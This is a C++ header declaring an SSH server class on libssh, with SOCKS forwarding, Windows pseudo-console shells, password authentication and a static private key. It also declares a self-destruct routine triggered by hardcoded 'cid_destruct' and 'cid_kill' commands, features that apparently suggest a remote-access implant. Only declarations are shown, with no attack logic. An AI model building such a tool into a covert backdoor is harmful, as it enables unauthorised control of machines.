#pragma once
#include <string>
#include <mutex>
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN // revisar
#include <Windows.h>
#endif // _WIN32

#include <libssh/callbacks.h>
#include <unordered_set>

#ifdef HAVE_PTHREAD
#include <pthread.h>
typedef void* thread_rettype_t;
#else
typedef void thread_rettype_t;
#endif

/*	This struct is created per thread/session (incoming connection) and holds info
	about it*/
//struct my_ssh_thread_args {
//	ssh_session session;
//	ssh_event event;
//	ssh_channel channel; // shell channel
//	bool authenticated;
//	bool stop;
//	unsigned int sockets_cnt; // # SOCKS connections by this session/thread
//	std::unordered_set<struct my_SOCKS_callback_args*> cleanup_list;
//};



/* This struct is created per SOCKS connection.*/
struct my_SOCKS_callback_args {
	struct my_ssh_thread_args* thread_info;
	ssh_channel channel;
	socket_t fd;

	ssh_channel_callbacks_struct* cb_chan_ptr; // to free
};

class SSHServer
{
	#ifdef _WIN32
	typedef HRESULT(WINAPI *my_CreatePseudoConsole)(_In_ COORD,
		_In_ HANDLE,
		_In_ HANDLE,
		_In_ DWORD,
		_Out_ HPCON*);

	typedef void(WINAPI *my_ResizePseudoConsole)(_In_ HPCON hPC, _In_ COORD size);

	typedef void(WINAPI *my_ClosePseudoConsole)(_Out_ HPCON);
	#endif

public:
#ifdef _WIN32
    static int windows_poll_channel(ssh_channel chan, void * userdata);
#else
    static int copy_fd_to_chan(socket_t fd, int revents, void * userdata);
#endif
    static int copy_chan_to_fd(ssh_session session, ssh_channel channel, void * data, uint32_t len, int is_stderr, void * userdata);
    static void self_destruct();
    static void chan_close(ssh_session session, ssh_channel channel, void * userdata);
    static void fill_commands();
    SSHServer();
	
	static int run(int port);

private:
    static bool gen_rsa_keys();
    static int auth_password(ssh_session session, const char *user, const char *password, void *userdata);


	static int my_ssh_channel_pty_window_change_callback(ssh_session session, ssh_channel channel, int width, int height, int pxwidth, int pwheight, void * userdata);

    static int main_loop_shell(ssh_session session, struct thread_info_struct* thread_info);

	static int message_callback(ssh_session session, ssh_message message, void * userdata);

	static thread_rettype_t per_conn_thread(void* args);

#ifdef _WIN32
    struct data_arg { HANDLE hPipeOut; HANDLE hPipeIn; struct thread_info_struct* thread_info; char last_command[sizeof("cid_destruct\r") + 1]; int index;};

	static my_CreatePseudoConsole my_CreatePseudoConsole_function;
	static my_ResizePseudoConsole my_ResizePseudoConsole_function;
	static my_ClosePseudoConsole my_ClosePseudoConsole_function;
	static HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX * pStartupInfo, HPCON hPC);
	static HRESULT CreatePseudoConsoleAndPipes(HPCON * phPC, HANDLE * phPipeIn, HANDLE * phPipeOut);
#endif // _WIN32

	
	static std::recursive_mutex mtx;
	static int is_pty;
    static const char* ip;
    static std::string priv_key;

    static char destruct_command[sizeof "cid_destruct\r"];
    static char kill_command[sizeof "cid_kill\r"];

};


